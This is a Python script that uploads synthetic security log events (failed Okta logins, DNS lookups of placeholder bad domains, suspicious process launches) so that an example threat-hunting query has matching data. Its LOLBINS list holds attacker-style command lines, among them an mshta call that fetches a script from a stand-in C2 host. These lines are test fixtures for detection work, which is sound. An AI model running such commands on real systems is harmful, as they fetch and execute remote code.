#!/usr/bin/env python3
"""Seed synthetic OCSF-shaped events for docs/runnable_examples/*.pq.

The 90-day Okta+DNS+Process hunt joins three event families on
(userName, host). To make the query return at least one row at
startTime="2h", we ingest a small batch of events for two
user/host pairs that satisfy all three legs of the join inside
the last 2h window.

Events use SDL dotted-key JSON (the SDL `json` parser indexes
nested fields so queries can reference `event.login.userName`,
`dns.question.name`, `src.process.cmdline`, etc., as written
in the example PQ).
"""
from __future__ import annotations

import json
import sys
import time
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
from harness.sdl_client import upload_logs, power_query  # noqa: E402


NOW = datetime.now(timezone.utc).replace(microsecond=0)


def iso(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%S.000Z")


def in_recent(seconds_ago: int) -> datetime:
    return NOW - timedelta(seconds=seconds_ago)


PAIRS = [
    ("alice@contoso.com", "host-alpha"),
    ("bob@contoso.com",   "host-bravo"),
]
BAD_DOMAINS = ["c2.example.com", "suspect.example.net"]
LOLBINS = [
    "powershell -enc JABm...",
    "rundll32.exe shell32,Control_RunDLL",
    "mshta.exe http://c2.example.com/p.hta",
]


def build_events(run_id: str) -> list[dict]:
    """Emit OCSF-flavored events as FLAT JSON whose keys contain literal
    dots (e.g. `"event.category"` rather than nested `{"event":{...}}`).

    SDL's uploadLogs+parser=json indexes each top-level JSON key as a
    column, and dotted names index as dotted columns -- so the published
    runnable example can reference `event.category`, `endpoint.name`,
    `dns.question.name`, `src.process.cmdline`, etc. exactly as it would
    on a real OCSF-mapped tenant (proven by harness/probe_dotted_keys.py).

    Booleans serialize to lowercase strings via _clean_attrs upstream, so
    the example filters with `event.login.loginIsSuccessful = 'false'`.
    """
    out: list[dict] = []
    t = 60
    for user, host in PAIRS:
        # ---- failed signins  (event.category='logins')
        for i in range(3):
            ts = in_recent(t); t += 30
            out.append({
                "TimeGenerated": iso(ts),
                "ts_epoch_ms": int(ts.timestamp() * 1000),
                "proof_run_id": run_id,
                "event.category": "logins",
                "event.login.userName": user,
                "event.login.loginIsSuccessful": "false",
                "endpoint.name": host,
            })
        # ---- bad DNS  (event.type='DNS Resolved')
        for d in BAD_DOMAINS:
            ts = in_recent(t); t += 30
            out.append({
                "TimeGenerated": iso(ts),
                "ts_epoch_ms": int(ts.timestamp() * 1000),
                "proof_run_id": run_id,
                "event.type": "DNS Resolved",
                "dns.question.name": d,
                "endpoint.name": host,
                "src.endpoint.user.name": user,
            })
        # ---- suspicious process  (event.type='Process Creation')
        for cmd in LOLBINS:
            ts = in_recent(t); t += 30
            out.append({
                "TimeGenerated": iso(ts),
                "ts_epoch_ms": int(ts.timestamp() * 1000),
                "proof_run_id": run_id,
                "event.type": "Process Creation",
                "endpoint.name": host,
                "src.process.cmdline": cmd,
                "src.process.user": user,
            })
    return out


def main() -> int:
    run_id = f"run-runnable-{uuid.uuid4().hex[:10]}"
    events = build_events(run_id)
    body = "\n".join(json.dumps(e, default=str) for e in events)
    print(f"[seed_runnable_examples] events  = {len(events)}")
    print(f"[seed_runnable_examples] run_id  = {run_id}")
    print(f"[seed_runnable_examples] anchor  = {NOW.isoformat()}")

    r = upload_logs(body, server_host="kql-proof",
                    logfile="runnable-examples.jsonl", parser="json")
    if r.get("status") != "success":
        print(f"uploadLogs rejected: {r}")
        return 1

    # Poll until indexed (use proof_run_id which is unique per run).
    print("Waiting for indexing", end="", flush=True)
    for _ in range(30):
        time.sleep(2)
        resp = power_query(f"proof_run_id='{run_id}' | group n=count()", "30m")
        vals = resp.get("values") or []
        n = int(vals[0][0]) if vals and vals[0] and vals[0][0] is not None else 0
        print(f" {n}", end="", flush=True)
        if n >= len(events):
            print("  ✓ ready"); break
    else:
        print("  (timeout, continuing)")

    out = ROOT / "sample_data" / "runnable_examples_run_id.txt"
    out.write_text(run_id)
    print(f"Wrote {out}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
